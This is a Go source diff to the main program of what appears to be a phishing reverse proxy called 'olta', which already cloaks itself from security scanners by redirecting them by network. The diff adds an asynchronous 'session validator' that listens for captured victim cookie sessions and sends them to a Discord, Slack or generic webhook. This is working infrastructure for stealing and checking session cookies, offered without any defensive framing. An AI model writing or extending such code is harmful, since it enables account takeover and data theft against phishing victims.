@@ -1,6 +1,7 @@
 package main
 
 import (
+	"errors"
 	"flag"
 	_log "log"
 	"os"
@@ -17,6 +18,8 @@ import (
 	"github.com/s4l1hs/olta/pkg/proxy/database"
 	"github.com/s4l1hs/olta/pkg/proxy/log"
 	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
+	"github.com/s4l1hs/olta/pkg/proxy/telemetry"
+	"github.com/s4l1hs/olta/pkg/proxy/validation"
 	"github.com/s4l1hs/olta/pkg/runtimepath"
 	"go.uber.org/zap"
 )
@@ -40,6 +43,8 @@ var cloaker_redirect_url = flag.String("cloaker-redirect-url", "https://www.goog
 var cloaker_action = flag.String("cloaker-action", string(asncloak.ActionRedirect), "Cloaker enforcement action: redirect or block")
 var cloaker_block_status = flag.Int("cloaker-block-status", 404, "HTTP status for the cloaker block action: 403 or 404")
 var cloaker_trust_proxy_headers = flag.Bool("cloaker-trust-proxy-headers", false, "Inspect client IP headers supplied by a trusted reverse proxy")
+var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
+var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook for session validation telemetry")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -171,6 +176,49 @@ func main() {
 			log.Error("proxy database shutdown: %v", err)
 		}
 	}()
+
+	var sessionValidator *validation.Worker
+	if *enable_session_validator {
+		if strings.TrimSpace(*webhook_url) == "" {
+			log.Fatal("session validator requires -webhook-url")
+			return
+		}
+		dispatcher, err := telemetry.NewDispatcher(*webhook_url, nil)
+		if err != nil {
+			log.Fatal("session validator webhook: %v", err)
+			return
+		}
+		sessionValidator, err = validation.NewWorker(validation.WorkerConfig{
+			Dispatcher: dispatcher,
+			OnResult: func(result validation.Result) {
+				log.Info("session validator: %s session %s for %s", result.Status, result.SessionReference, result.TargetHost)
+			},
+			OnError: func(err error) {
+				log.Error("session validator: %v", err)
+			},
+		})
+		if err != nil {
+			log.Fatal("session validator: %v", err)
+			return
+		}
+		defer func() {
+			if err := sessionValidator.Close(); err != nil {
+				log.Error("session validator shutdown: %v", err)
+			}
+		}()
+		unsubscribe := db.SubscribeSessionCaptures(func(session *database.Session) {
+			event, eventErr := validation.NewEvent(session)
+			if eventErr != nil {
+				log.Warning("session validator event: %v", eventErr)
+				return
+			}
+			if enqueueErr := sessionValidator.Enqueue(event); enqueueErr != nil && !errors.Is(enqueueErr, validation.ErrDuplicateEvent) {
+				log.Warning("session validator queue: %v", enqueueErr)
+			}
+		})
+		defer unsubscribe()
+		log.Info("asynchronous session validator enabled with %s telemetry", dispatcher.Provider())
+	}
 
 	campaignEvents, err := campaignstore.New(*campaign_db, *feed_url, *feed_enabled)
 	if err != nil {
